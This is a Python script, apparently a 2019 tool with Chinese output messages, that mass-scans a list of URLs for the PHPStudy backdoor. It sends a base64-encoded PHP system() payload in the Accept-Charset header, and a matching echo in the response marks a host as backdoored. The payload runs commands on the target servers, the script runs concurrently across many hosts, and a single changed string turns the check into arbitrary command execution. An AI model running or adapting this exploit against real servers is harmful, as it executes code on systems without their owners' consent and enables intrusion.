#@author:九世
#@file:scan.py
#@time: 2019/9/23

from gevent import monkey;monkey.patch_all()
from multiprocessing import Process
import requests
import sys
import gevent
import os

class Gz(object):
    def __init__(self):
        self.guanjianzi='haq5201314'
        self.payload='c3lzdGVtKCJlY2hvIGhhcTUyMDEzMTQiKTs='
        self.headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0',
                      'Accept-Encoding':'gzip,deflate',
                      'Accept-Charset':'c3lzdGVtKCJlY2hvIGhhcTUyMDEzMTQiKTs='}

        self.calc=0
        self.djcs=[]
        self.xcs=[]
    def scan_query(self,url):
        try:
            rqt=requests.get(url=url,headers=self.headers)
            if self.guanjianzi in rqt.text:
                print('[ok] 存在PHPstudy 后门漏洞,url:{}'.format(rqt.url))
            else:
                print('[no] 不存在后门,url:{}'.format(rqt.url))
        except Exception as r:
            print('[Error] {}'.format(r))

    def djc(self):
        if os.path.exists(sys.argv[1]):
            print('[ok] 文件存在:{}'.format(sys.argv[1]))
        else:
            print('[-] 文件不存在:{}'.format(sys.argv[1]))
            exit()

        dk=open(sys.argv[1],'r',encoding='utf-8')
        for j in dk.readlines():
            if self.calc==100:
                p=Process(target=self.xc,args=(self.djcs,))
                p.start()
                self.calc=0
                self.djcs.clear()
            data="".join(j.split('\n'))
            self.djcs.append(data)
            self.calc+=1

        if len(self.djcs)>0:
            p = Process(target=self.xc, args=(self.djcs,))
            p.start()

    def xc(self,rw):
        [self.xcs.append(gevent.spawn(self.scan_query,x)) for x in rw]
        gevent.joinall(self.xcs)

if __name__ == '__main__':
    obj=Gz()
    try:
        obj.djc()
    except Exception as r:
        if 'list index out of range' in str(r):
            print('脚本格式:python scan.py [file]')